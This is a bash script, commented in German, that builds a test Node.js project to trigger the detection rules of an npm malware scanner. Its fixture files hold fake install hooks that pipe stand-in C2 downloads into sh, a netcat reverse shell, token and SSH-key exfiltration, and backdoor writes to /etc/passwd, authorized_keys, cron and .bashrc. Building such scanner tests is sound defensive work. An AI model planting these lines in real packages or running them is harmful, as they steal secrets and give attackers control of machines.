#!/usr/bin/env bash
# testproject.sh
# Erstellt ein Test-Node.js-Projekt, das alle scan-npm.py-Erkennungsregeln triggert.
# Es wird kein Schadcode ausgeführt — alle verdächtigen Inhalte sind inerte Testdaten.

set -euo pipefail

TESTDIR="/tmp/npm-scan-testproject"
SCANNER="$(cd "$(dirname "$0")" && pwd)/scan-npm.py"

echo "=== Erstelle Testprojekt in $TESTDIR ==="
rm -rf "$TESTDIR"
mkdir -p "$TESTDIR"
cd "$TESTDIR"

# Git-Repo initialisieren (Scanner nutzt git ls-files)
git init -q
git config user.email "scanner-test@example.com"
git config user.name "Scanner Test"

# Basis-npm-Projekt anlegen (falls npm verfügbar)
if command -v npm &>/dev/null; then
    npm init -y > /dev/null 2>&1
else
    echo '{"name":"npm-scan-test-fixture","version":"1.0.0"}' > package.json
fi

# -------------------------------------------------------------------
# 1. package.json
#    Triggert: LIFECYCLE_HOOKS_FOUND, INSTALL_SCRIPT (curl/wget/chmod/
#    python3-c/base64-decode/eval/node-e/stratum/xmrig/.ssh/process.env+net),
#    SUPPLY_CHAIN (Git-URL-Deps), INSTALL_SCRIPT (gypfile:true)
# -------------------------------------------------------------------
cat > package.json << 'PKGJSON'
{
  "name": "npm-scan-test-fixture",
  "version": "1.0.0",
  "description": "Statisches Test-Fixture fuer scan-npm.py — kein echter Schadcode",
  "gypfile": true,
  "scripts": {
    "postinstall": "curl http://c2.evil.example.com/dropper.sh | sh",
    "preinstall":  "wget http://evil.example.com/malware && chmod 755 malware",
    "prepare":     "python3 -c 'import os; os.system(\"cat /etc/passwd\")'",
    "install":     "echo Y3VybA== | base64 --decode | sh && eval(exec('id'))",
    "prepack":     "node -e \"require('http').get('http://c2.example.com?e='+process.env.HOME)\"",
    "postpack":    "xmrig --pool stratum+tcp://pool.xmr.example.com:3333 --user evil@test.com"
  },
  "dependencies": {
    "lodash":        "^4.17.21",
    "evil-backdoor": "git+https://github.com/attacker/evil-pkg.git",
    "stealth-pkg":   "github:attacker/malware-pkg"
  }
}
PKGJSON

# -------------------------------------------------------------------
# 2. .npmrc
#    Triggert: SUPPLY_CHAIN (Nicht-Standard-Registry),
#              EXFILTRATION (hardcodierter Auth-Token)
# -------------------------------------------------------------------
cat > .npmrc << 'NPMRC'
registry=https://evil-registry.example.com/npm/
//evil-registry.example.com/npm/:_authToken=npm_FAKETOKEN0123456789abcdefghijklmnop
NPMRC

# -------------------------------------------------------------------
# 3. .yarnrc (Yarn v1)
#    Triggert: SUPPLY_CHAIN (Nicht-Standard-Registry),
#              EXFILTRATION (hardcodiertes Token)
# -------------------------------------------------------------------
cat > .yarnrc << 'YARNRC'
registry https://evil-registry.example.com/yarn/
//evil-registry.example.com/:_authToken=fake_yarn_token_0123456789abcdef
YARNRC

# -------------------------------------------------------------------
# 4. .yarnrc.yml (Yarn v2/v3)
#    Triggert: SUPPLY_CHAIN (Nicht-Standard-Registry, externe Plugin-URL HIGH),
#              EXFILTRATION (hardcodierter Token)
# -------------------------------------------------------------------
cat > .yarnrc.yml << 'YARNRCYML'
npmRegistryServer: "https://evil-registry.example.com/yarn/"
npmAuthToken: "fake_yarnv2_token_0123456789abcdef"
plugins:
  - path: https://evil-registry.example.com/yarn-plugin-evil.cjs
    spec: "https://evil-registry.example.com/yarn-plugin-evil.cjs"
YARNRCYML

# -------------------------------------------------------------------
# 5. package-lock.json
#    Triggert: SUPPLY_CHAIN (aufgeloeste URL zeigt auf Nicht-Standard-Registry)
# -------------------------------------------------------------------
cat > package-lock.json << 'LOCKJSON'
{
  "name": "npm-scan-test-fixture",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": { "name": "npm-scan-test-fixture", "version": "1.0.0" },
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-fake"
    },
    "node_modules/evil-backdoor": {
      "version": "1.0.0",
      "resolved": "https://evil-registry.example.com/npm/evil-backdoor-1.0.0.tgz",
      "integrity": "sha512-FAKEFAKEFAKE"
    }
  }
}
LOCKJSON

# -------------------------------------------------------------------
# 6. binding.gyp
#    Triggert: INSTALL_SCRIPT MEDIUM (impliziter node-gyp-Hook),
#              INSTALL_SCRIPT HIGH (curl in Action),
#              INSTALL_SCRIPT HIGH (nc/netcat in Action)
# -------------------------------------------------------------------
cat > binding.gyp << 'BINDINGYP'
{
  "targets": [{
    "target_name": "evil_addon",
    "sources": ["src/addon.cc"],
    "actions": [
      {
        "action_name": "fetch_payload",
        "inputs": [],
        "outputs": ["<(PRODUCT_DIR)/payload"],
        "action": ["curl", "http://evil.example.com/payload", "-o", "<(PRODUCT_DIR)/payload"]
      },
      {
        "action_name": "reverse_shell",
        "inputs": [],
        "outputs": [],
        "action": ["nc", "-e", "/bin/sh", "attacker.example.com", "4444"]
      }
    ]
  }]
}
BINDINGYP

# -------------------------------------------------------------------
# 7. src/evil.js
#    Triggert alle CODE_THREAT_RULES-Kategorien:
#    OBFUSCATION (HIGH/MEDIUM/LOW), EXFILTRATION (HIGH/MEDIUM),
#    FILESYSTEM_ATTACK (HIGH/MEDIUM), REMOTE_EXEC (HIGH/MEDIUM),
#    CRYPTOMINING (HIGH/MEDIUM), SUPPLY_CHAIN (HIGH/MEDIUM/LOW)
# -------------------------------------------------------------------
mkdir -p src
cat > src/evil.js << 'EVILJS'
'use strict';
const fs = require('fs');
const net = require('net');
const vm = require('vm');
const https = require('https');

// ── OBFUSCATION ──────────────────────────────────────────────────────────────

// HIGH: eval() eines dekodierten Puffers
eval(Buffer.from(atob("cHJvY2Vzcy5leGl0KDApCg=="), 'base64'));

// HIGH: langer Hex-String via Buffer.from (32+ Hex-Zeichen)
Buffer.from("deadbeefcafe0123456789abcdef001122334455", "hex");

// HIGH: langer Base64-String via Buffer.from (40+ Zeichen)
Buffer.from("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQ=", "base64");

// HIGH: String.fromCharCode mit vielen Argumenten (6+)
String.fromCharCode(115, 101, 99, 114, 101, 116, 32, 112, 97, 121, 108, 111, 97, 100);

// MEDIUM: verschleierte _0x-Variablennamen
var _0xdeadbeef = function(_0x1a2b3c) { return _0x1a2b3c; };

// MEDIUM: sehr langer Hex-String in Variable (64+ Zeichen)
const _longHex = "aabbccdd1122334455667788aabbccdd1122334455667788aabbccdd11223344aabb";

// LOW: unescape() eines prozentkodierten Payloads (6+ Sequenzen)
unescape("%65%76%61%6c%28%27%64%61%6e%67%65%72%6f%75%73%27%29");

// HIGH: Klammer-Notation mit String-Konkatenation
const obj = {}; obj["ex"+"ec"]("id");

// HIGH: require() mit aufgeteiltem String
require("child_"+"process");

// MEDIUM: eval() eines zusammengesetzten Literals
eval("re"+"qui"+"re('fs')");

// HIGH: Zwei-Schritt-Muster — Variable haelt zusammengesetzten Modulnamen
const cp = 'child_' + 'process';
require(cp);

// ── EXFILTRATION ─────────────────────────────────────────────────────────────

// HIGH: process.env + HTTP-Aufruf auf derselben Zeile
const secret = process.env.AWS_SECRET_ACCESS_KEY; fetch('http://c2.evil.example.com?k=' + secret);

// HIGH: sensibler Umgebungsvariablenname neben Netzwerkaufruf
const tok = process.env.GITHUB_TOKEN; fetch('http://attacker.example.com/collect?t=' + tok);

// HIGH: readFileSync liest SSH-Schluesseldatei
const privKey = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');

// MEDIUM: os.homedir() kombiniert mit .ssh-Pfad
const os = require('os');
const sshPath = os.homedir() + '/.ssh/id_rsa';

// MEDIUM: keytar-Zugriff auf OS-Schluessel-Store
require('keytar');

// ── FILESYSTEM_ATTACK ────────────────────────────────────────────────────────

// HIGH: Schreiben in /etc/passwd
fs.writeFile('/etc/passwd', 'backdoor:x:0:0:root:/root:/bin/bash\n', () => {});

// HIGH: Schreiben in authorized_keys (SSH-Backdoor)
fs.appendFile('/home/user/.ssh/authorized_keys', 'ssh-rsa AAAA evil@attacker.com\n', () => {});

// MEDIUM: Schreiben in Cron-Verzeichnis
fs.writeFile('/etc/cron.d/backdoor', '* * * * * root curl http://c2.example.com | sh\n', () => {});

// MEDIUM: Schreiben in .bashrc (Persistenz)
fs.appendFile('/home/user/.bashrc', '\ncurl http://c2.evil.example.com/init | sh\n', () => {});

// ── REMOTE_EXEC ──────────────────────────────────────────────────────────────

// HIGH: child_process.exec mit Remote-Aufruf
require('child_process').exec('id && curl http://c2.evil.example.com/beacon');

// HIGH: new Function() mit Netzwerk-/Dekodierungsinhalt
new Function('return fetch("http://c2.evil.example.com/cmd").then(r=>r.text()).then(eval)')();

// MEDIUM: Node.js vm-Modul
vm.runInNewContext('process.exit(1)', { process });

// MEDIUM: fetch() kombiniert mit eval()
https.get('http://c2.evil.example.com/payload', d => { eval(d.toString()); });

// HIGH: Reverse-Shell via net.connect an stdin/stdout gebunden
net.connect(4444, 'attacker.evil.example.com', function() { process.stdin.pipe(this); this.pipe(process.stdout); });

// HIGH: /bin/sh Reverse-Shell-Muster
require('child_process').spawn('/bin/sh', ['-i'], {stdio: ['pipe', socket, 'pipe']});

// ── CRYPTOMINING ─────────────────────────────────────────────────────────────

// HIGH: Stratum-Mining-Protokoll-URL
const poolUrl = 'stratum+tcp://pool.xmr.hashvault.pro:3333';

// HIGH: bekannter Miner-Binaername
const miner = require('xmrig');

// HIGH: bekannte Krypto-Mining-Domain
const miningLib = 'https://coinhive.com/lib/coinhive.min.js';

// MEDIUM: Mining-Algorithmusname
const algorithm = 'CryptoNight';

// ── SUPPLY_CHAIN ─────────────────────────────────────────────────────────────

// HIGH: Module._compile mit verschluesseltem Inhalt (Event-Stream-Stil)
Module._compile(decrypt(Buffer.from('cHJvY2Vzcy5leGl0KDApCg==', 'base64')), 'injected.js');

// HIGH: Einschleusen in require.extensions
require.extensions['.evil'] = function(module, filename) { eval(fs.readFileSync(filename, 'utf8')); };

// MEDIUM: npm_lifecycle_event neben Netzwerkaufruf
if (process.env.npm_lifecycle_event === 'postinstall') { fetch('http://c2.evil.example.com/exfil?pkg=' + process.env.npm_package_name); }

// LOW: Webpack-Interna kombiniert mit eval
const cached = __webpack_require__.c[42]; eval(cached.exports.toString());
EVILJS

# LOW: minimierter Code — Zeile laenger als 1000 Zeichen
python3 -c "print(\"var _min='\" + 'a'*1050 + \"';\")" >> src/evil.js

# -------------------------------------------------------------------
# 8. src/native_addon.node
#    Triggert: SUPPLY_CHAIN MEDIUM (nicht analysierbarer Nativer Code)
# -------------------------------------------------------------------
printf '\x7fELF\x02\x01\x01\x00' > src/native_addon.node

# -------------------------------------------------------------------
# Alle Dateien tracken und committen
# -------------------------------------------------------------------
git add -A
git commit -q -m "test: scanner test fixture — inerte Muster ohne echten Schadcode"

echo ""
echo "=== Starte scan-npm.py gegen Testprojekt ==="
echo ""
python3 "$SCANNER" "$TESTDIR" || true

echo ""
read -r -p "Testprojekt $TESTDIR loeschen? [j/N] " _ans
if [[ "${_ans,,}" == "j" ]]; then
    rm -rf "$TESTDIR"
    echo "Geloescht: $TESTDIR"
else
    echo "Behalten: $TESTDIR"
    echo "Erneut scannen: python3 $SCANNER $TESTDIR --no-fail"
fi
